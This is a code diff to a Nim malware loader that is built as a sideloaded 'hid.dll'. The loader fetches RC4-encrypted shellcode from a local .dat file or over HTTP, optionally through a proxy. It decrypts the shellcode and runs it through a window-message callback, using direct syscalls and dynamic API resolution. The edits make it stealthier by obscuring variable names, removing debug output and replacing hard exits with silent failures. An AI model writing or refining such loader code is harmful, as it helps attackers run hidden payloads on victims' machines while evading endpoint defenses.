@@ -18,6 +18,8 @@ when defined(net):
   import core/build_ua
   import httpclient, net
 
+# SC exec via callback, sandwiched in a window message routine
+# SC is either in a .dat file next to the program on disk or pulled over net
 # nim c --app:lib -d:strip -d:ondisk/net -d:release --passL:"-def:hid.def" --nomain --cc:gcc --passL:-static --out:hid.dll loader_hid_t2.nim
 
 proc NimMain() {.cdecl, importc.}
@@ -58,8 +60,8 @@ dinvokeDefine(UnhookWindowsHookEx, "user32.dll", proc (hhk: HHOOK): WINBOOL {.st
 proc HidD_MainRoutine(): bool =
   var 
     shellcode: seq[byte]
-    data: string
-    decrypted: string
+    dscn: string
+    dscd: string
     
   when defined(ondisk):
     var
@@ -87,13 +89,13 @@ proc HidD_MainRoutine(): bool =
     let fs = int(fsi.EndOfFile.QuadPart)
     if fs <= 0:
       discard syscall(NtClose, hFile)
-      quit(3)
+      return false
     
     var sc = newSeq[byte](fs)
     fStatus = syscall(NtReadFile, hFile, 0, 0, 0, &isob, cast[pointer](&sc[0]), ULONG(fs), NULL, NULL)
     
-    decrypted = bytesToString(rc4Apply(toBytes(rc4Key), sc))
-    shellcode = toByteSeq(decrypted)
+    dscd = bytesToString(rc4Apply(toBytes(rc4Key), sc))
+    shellcode = toByteSeq(dscd)
 
   when defined(net):
     let 
@@ -112,7 +114,6 @@ proc HidD_MainRoutine(): bool =
       let proxy = newProxy(proxyUrl)
       client = newHttpClient(proxy=proxy)
     else:
-      echo "set reg client"
       client = newHttpClient()
     
     #client.timeout = 10
@@ -122,10 +123,11 @@ proc HidD_MainRoutine(): bool =
     
     response = client.request(url, httpMethod=HttpGet)
     if response.code.is2xx:
-      data = frcDec(rc4Key, decode(response.body))
-      sc = toByteSeq(data)
+      dscn = frcDec(rc4Key, decode(response.body))
+      shellcode = toByteSeq(dscn)
     else:
-      quit(3)
+      client.close()
+      return false 
     
     if not client.isNil:
       client.close()
